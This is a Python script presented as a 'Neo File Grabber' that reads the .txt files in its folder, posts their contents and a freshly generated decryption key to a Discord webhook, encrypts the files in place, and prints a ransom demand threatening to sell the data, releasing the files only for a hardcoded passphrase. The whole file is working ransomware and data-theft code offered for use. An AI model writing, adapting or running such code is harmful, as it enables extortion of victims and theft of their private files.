import os
import asyncio 
import discord 
from discord import Webhook
import aiohttp 
from cryptography.fernet import Fernet

async def sendWebhook(url, embed):
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(url, session=session)
        await webhook.send(embed=embed, username="Neo")
        
def report(embed):
    url = ""

    loop = asyncio.new_event_loop()
    loop.run_until_complete(sendWebhook(url, embed))
    loop.close()

key = Fernet.generate_key()

def encrypt(files, key):
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        encrypted_contents = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(encrypted_contents)

def decrypt(file, key):
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        decrypted_contents = Fernet(key).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(decrypted_contents)

# -------------------------
# Get the files.
# -------------------------

files = []

for file in os.listdir():
    if file == "neo.py":
        continue
    if os.path.isfile(file) and file.endswith('.txt'):
        files.append(file)


# -------------------------
# Create the embed.
# -------------------------

embed=discord.Embed(title="---------------- NEW FILE DUMP ----------------", description="DUMP data below:", color=0xff0000)
embed.set_author(name="Neo File Grabber")
embed.add_field(name="DECRYPT KEY", value=str(key), inline=False)

# -------------------------
# Add files and contents to the embeds.
# -------------------------

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    embed.add_field(name=file, value=str(contents), inline=False)

# -------------------------
# Send the embed to discord.
# -------------------------

report(embed)

# -------------------------
# Encrypt the files.
# -------------------------

encrypt(files, key)

# -------------------------
# Scare the victim.
# -------------------------

print("\n-------------------------------------------------------------------------\n Your files just got sent to me and encrypted on ur device lol, gimmi $100 or im selling the file data.\n-------------------------------------------------------------------------")

# -------------------------
# Decrypt if passphrase is entered correctly.
# -------------------------

secret_phrase = "andrewiscool"

user_phrase = input("\nEnter the phrase to get your files back:\n")

if user_phrase == secret_phrase:
    decrypt(files, key)
    print("\nHooray you got the right passphrase!")
    print("I decrepted ur files but im still gonna sell them LOL :)")
else:
    print("\nWRONG :((((")
    print("Ur files are gone lol.")